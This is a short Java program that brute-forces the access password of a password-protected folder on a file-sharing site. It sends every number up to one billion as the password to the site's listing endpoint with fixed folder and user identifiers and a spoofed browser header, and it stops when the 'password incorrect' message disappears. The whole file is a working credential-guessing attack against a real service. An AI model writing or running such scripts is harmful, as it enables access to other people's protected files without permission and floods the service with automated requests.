package com.shilei.tourist;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;

public class test1 {

    public static void main(String[] args) {
        for (int i = 0; i < 1000000000; i++) {
            String result = main(String.valueOf(i));
            System.out.println(i);
            if (!result.contains("\\u5bc6\\u7801\\u4e0d\\u6b63\\u786e")){
                break;
            }
        }
    }

     static String main(String pwd) {
        OutputStreamWriter out = null ;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        String url = "https://lanzous.com/filemoreajax.php";
        try {
            URL realUrl = new URL(url);
            // 打开和URL之间的连接
            URLConnection conn = realUrl.openConnection();
            //设置通用的请求头属性
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            // 发送POST请求必须设置如下两行   否则会抛异常（java.net.ProtocolException: cannot write to a URLConnection if doOutput=false - call setDoOutput(true)）
            conn.setDoOutput(true);
            conn.setDoInput(true);
            //获取URLConnection对象对应的输出流并开始发送参数
            out = new OutputStreamWriter(conn.getOutputStream(), "UTF-8");
            //添加参数
            out.write("&lx="+"2");
            out.write("&fid="+"1628193");
            out.write("&uid="+"358715");
            out.write("&pg="+"1");
            out.write("&rep="+"0");
            out.write("&t="+"1589275196");
            out.write("&k="+"83984864cc093d515a4820a6912353c0");
            out.write("&up="+"1");
            out.write("&vip="+"0");
            out.write("&ls="+"1");
            out.write("&pwd="+pwd);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream(),"UTF-8"));
            String line;
            while ((line = in.readLine()) != null) {
                result.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }finally {// 使用finally块来关闭输出流、输入流
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        return result.toString();
    }

}